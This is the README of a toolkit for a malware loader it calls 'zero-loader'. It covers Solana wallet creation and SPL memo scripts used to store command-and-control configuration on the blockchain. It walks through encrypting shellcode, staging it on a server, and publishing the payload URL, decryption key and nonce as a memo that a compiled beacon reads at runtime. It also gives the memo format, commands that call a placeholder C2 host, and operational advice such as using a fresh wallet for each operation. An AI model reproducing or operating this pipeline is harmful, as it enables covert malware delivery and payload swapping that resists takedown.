# solana

Three utility scripts for Solana wallet management and SPL Memo publishing.
Used by the zero-loader pipeline to store C2 configuration on-chain.

## Install

```bash
pip install -r requirements.txt
```

Requires Python 3.9+ and the `solders` + `requests` packages.

---

## Scripts

### `create_wallet.py` — Generate a new wallet

```bash
python create_wallet.py [--out wallet]
```

Creates a new Ed25519 keypair and writes:
- **`wallet.json`** — 64-byte keypair as a JSON int array (compatible with
  Solana CLI, Phantom, Backpack, etc.)
- **`wallet.info.txt`** — human-readable address + base58 private key

**Fund the address** with a small amount of SOL before publishing memos
(each transaction costs ~0.000005 SOL).

```bash
# Check balance
solana balance <address> --url mainnet-beta

# Airdrop on devnet for testing
solana airdrop 1 <address> --url devnet
```

---

### `lookup_memo.py` — Find SPL Memo text from a wallet

```bash
python lookup_memo.py <address> [--rpc <url>] [--first] [--limit N]
```

Scans the wallet's recent transactions for the first SPL Memo instruction
(`Program log: <text>` in the transaction's log messages).

By default returns the **latest** (most recent) memo.

| Flag | Description |
|------|-------------|
| `--first` | Return the **oldest/first-ever** memo — this matches what the zero-loader C beacon does at runtime |
| `--limit N` | How many recent signatures to scan (default 20, max 1000) |
| `--rpc <url>` | Custom RPC endpoint |
| `--json` | Machine-readable JSON output |

```bash
# Check what memo the loader beacon will read
python lookup_memo.py AbCd1234...44chars --first

# Latest memo, devnet
python lookup_memo.py AbCd1234...44chars --rpc https://api.devnet.solana.com
```

---

### `publish_memo.py` — Post a memo transaction on-chain

```bash
python publish_memo.py --keypair wallet.json --memo "<text>" [--rpc <url>]
```

Broadcasts a Solana transaction containing the given text as an SPL Memo
instruction, signed by the keypair in `wallet.json`.

| Flag | Description |
|------|-------------|
| `--keypair <file>` | Path to the 64-byte keypair JSON file |
| `--memo <text>` | Memo text to publish |
| `--rpc <url>` | Custom RPC endpoint |
| `--json` | Machine-readable JSON output |

```bash
# Publish the zero-loader beacon memo (contents of memo.txt from Encrypt.py)
python publish_memo.py \
    --keypair wallet.json \
    --memo "https://c2.example.com/payload.dat|a1b2...32hex...|001122...24hex...|725708|1"

# Test on devnet
python publish_memo.py \
    --keypair wallet.json \
    --memo "test" \
    --rpc https://api.devnet.solana.com
```

---

## Zero-loader workflow

```
┌─────────────────────────────────────────────────────────────────────────┐
│  1. Create wallet  →  fund it  →  note the public address               │
│                                                                          │
│  2. Encrypt.py shellcode.bin --url https://c2/x.dat                     │
│                              --sol-wallet <ADDRESS>                     │
│     → x.dat   (upload to staging server)                                │
│     → memo.txt (the string you must post on-chain)                      │
│                                                                          │
│  3. publish_memo.py --keypair wallet.json                               │
│                     --memo "$(cat memo.txt)"                            │
│                                                                          │
│  4. build.bat   (once — binary works for any future payload swap)       │
│                                                                          │
│  ---- Swap payload without rebuild: ----                                │
│  5. Encrypt.py new_shellcode.bin --url https://c2/x.dat                 │
│                                  --sol-wallet <ADDRESS>                 │
│  6. Upload new x.dat to staging server                                  │
│  7. publish_memo.py --keypair wallet.json --memo "$(cat memo.txt)"      │
└─────────────────────────────────────────────────────────────────────────┘
```

The compiled binary only stores the **wallet address** and the RPC hostname.
All payload-specific data (URL, Chaskey key, nonce, size, compression flag)
lives immutably on the Solana blockchain — swapping payloads never requires
a rebuild.

---

## Memo format

```
<staging_url>|<32-hex-chaskey-key>|<24-hex-nonce>|<decimal-original-size>|<0-or-1>
```

Example:
```
https://c2.example.com/payload.dat|a1b2c3d4...32chars...|001122334455...24chars...|725708|1
```

Fields:
| # | Content | Notes |
|---|---------|-------|
| 1 | Staging URL | Full HTTPS URL to the encrypted payload file |
| 2 | Chaskey-12 key | 32 hex chars (16 bytes) |
| 3 | Chaskey CTR nonce | 24 hex chars (12 bytes) |
| 4 | Original size | Decimal byte count before compression |
| 5 | Compression flag | `1` = LZNT1 compressed, `0` = raw |

---

## Security notes

- Keep `wallet.json` secret — it contains the 64-byte private key.
- Anyone who sees the on-chain memo can read the staging URL; protect your
  C2 infrastructure accordingly (firewall, short-lived URLs, rotating keys).
- Use a fresh wallet for each operation; do not reuse beacon wallets.
